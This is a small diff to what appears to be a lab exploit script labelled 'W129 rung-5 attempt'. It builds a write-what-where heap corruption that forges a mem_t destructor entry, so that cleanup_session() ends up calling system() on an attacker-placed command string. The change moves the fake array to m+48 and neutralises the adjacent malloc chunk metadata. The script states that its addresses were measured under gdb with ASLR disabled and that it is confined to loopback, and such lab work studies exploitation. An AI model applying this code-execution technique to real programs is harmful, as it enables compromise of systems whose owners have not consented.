@@ -2,8 +2,9 @@
 """W129 rung-5 attempt: write-what-where -> fake mem_t destructor entry.
 
 Uses the W129 `t`-slot redirect to write a contiguous blob into session->mem:
-  m+12: arr_count = 1, padding, arr = m+24
-  m+24: {f = system, p = command string in the prime}
+  m+12: arr_count = 1, arr = m+48, with the adjacent malloc chunk header and
+  memlist neutralised so the write stays inside live heap metadata
+  m+48: {f = system, p = command string in the prime}
 cleanup_session() then calls mem_destroy(session->mem), which invokes
 m->arr[0].f(m->arr[0].p) == system("<lab-chosen benign command>").
 All addresses are lab-measured under gdb (ASLR disabled); no off-loopback
@@ -89,7 +90,6 @@ def main():
     transit[104:112] = target.to_bytes(8, "little")
     transit[128:136] = (12).to_bytes(8, "little")
 
-    fake_arr = mem + 24
     fake_arr = mem + 48
 
     # One contiguous write from m+12 to m+63.  Preserve the malloc chunk
